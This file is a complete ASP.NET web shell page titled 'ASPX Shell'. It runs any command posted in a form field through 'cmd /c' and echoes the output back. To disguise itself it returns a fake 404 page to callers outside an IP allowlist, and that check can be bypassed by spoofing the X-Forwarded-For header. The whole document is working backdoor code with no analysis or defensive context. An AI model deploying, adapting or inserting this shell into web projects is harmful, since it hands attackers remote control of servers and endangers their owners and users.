<%@ Page Language="C#"%>
<%@ Import Namespace="System" %>

<script runat="server">

/********************************************************************************
***
*** This file provides shell access to the system.
***
***************************************************************************** */
string stdout = "";
string stderr = "";
void die() {
	//HttpContext.Current.Response.Clear();
	HttpContext.Current.Response.StatusCode = 404;
	HttpContext.Current.Response.StatusDescription = "Not Found";
	HttpContext.Current.Response.Write("<h1>404 Not Found</h1>");
	HttpContext.Current.Server.ClearError();
	HttpContext.Current.Response.End();
}
void Page_Load(object sender, System.EventArgs e) {
	// Check for an IP in the range we want
	string[] allowedIps = new string[] {"::1","192.168.43.112", "127.0.0.1"};
	
	// check if the X-Fordarded-For header exits
	string remoteIp;
	if (HttpContext.Current.Request.Headers["X-Forwarded-For"] == null) {
		remoteIp = Request.UserHostAddress;
	} else {
		remoteIp = HttpContext.Current.Request.Headers["X-Forwarded-For"].Split(new char[] { ',' })[0]; 
	}
	bool validIp = false;
	foreach (string ip in allowedIps) {
		validIp = (validIp || (remoteIp == ip));
	}
	
	if (!validIp) {
		die();
	}
	
	if (Request.Form["c"] != null) {
	// do or do not, there is no try
	//try {
		// create the ProcessStartInfo using "cmd" as the program to be run, and "/c " as the parameters.
		// "/c" tells cmd that we want it to execute the command that follows, and exit.
		System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + Request.Form["c"]);
		// The following commands are needed to redirect the standard output and standard error.
		procStartInfo.RedirectStandardOutput = true;
		procStartInfo.RedirectStandardError = true;
		procStartInfo.UseShellExecute = false;
		// Do not create the black window.
		procStartInfo.CreateNoWindow = true;
		// Now we create a process, assign its ProcessStartInfo and start it
		System.Diagnostics.Process p = new System.Diagnostics.Process();
		p.StartInfo = procStartInfo;
		p.Start();
		// Get the output and error into a string
		stdout = p.StandardOutput.ReadToEnd();
		stderr = p.StandardError.ReadToEnd();
	//}
	//catch (Exception objException)
	//{
	}
}
</script>
<html>
<head><title>ASPX Shell</title></head>
<body onload="document.shell.c.focus()">

<form method="post" name="shell">
cmd /c <input type="text" name="c"/>
<input type="submit"><br/>
STDOUT:<br/>
<pre><%=stdout.Replace("<", "&lt;")%></pre>
<br/>
<br/>
<br/>
STDERR:<br/>
<pre><%=stderr.Replace("<", "&lt;")%></pre>


</form>

  <hr/>

</body>
</html>